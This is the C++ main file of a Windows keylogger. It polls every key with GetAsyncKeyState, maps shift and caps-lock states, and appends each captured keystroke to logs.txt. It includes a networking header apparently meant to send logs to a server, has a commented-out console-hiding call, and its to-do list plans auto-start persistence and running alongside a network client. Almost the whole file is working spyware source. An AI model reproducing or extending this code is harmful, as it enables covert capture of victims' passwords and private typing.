/*
*    ``~ Main file for the keylogger program (Written by haeoro) ~``
*
*    WinMain() initializes all mappings, checks if any key on the keyboard is being pressed.
*    once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
*    and logged, and that it should continue checking other keys to see if they're being pressed. 
*
*    writeKeyStroke() takes an int key argument, then converts that integer to it's corresponding ascii value using 
*    static_cast conversion method, then closes the file.
*/

#include "core/mappings.h"
#include "core/constants.h"
#include "core/find_shift_keys.h"
#include "networking/ks2server.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

void writeKeyStroke(int trueKey)
{
    std::ofstream file;
    file.open("logs.txt", std::ios::app);
    char trueKeyC = static_cast<char>(trueKey);
    if (trueKey == ENTER)
    {
        file << "\n";
    } 
    else 
    {
        file << trueKeyC;
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    //FreeConsole();
    Maps vkMaps;
    vkMaps.initializeMaps();
    while (true)
    {
        for (int i = 1; i < 254; i++)
        {
            int key = GetAsyncKeyState(i);
            int dontLogShiftKey = (i != 16 && i != 160 && i != 161);
            while (key == KEY_IS_PRESSED && dontLogShiftKey)
            {
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey());
                }
                else if (vkMaps.searchMiscMaps(i) != 1) 
                {
                    // null statement as there is no code logic required here.
                    ;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey);
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey);
                }
                key = 0;
            }
        }
    }
}

/*
    Notes
    

    To-Do list

    in ks2server.cpp:
    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
    ~ write code to schedule this program to be run on startup.
    ~ find a way to run keylogger and client model asynchronously.
*/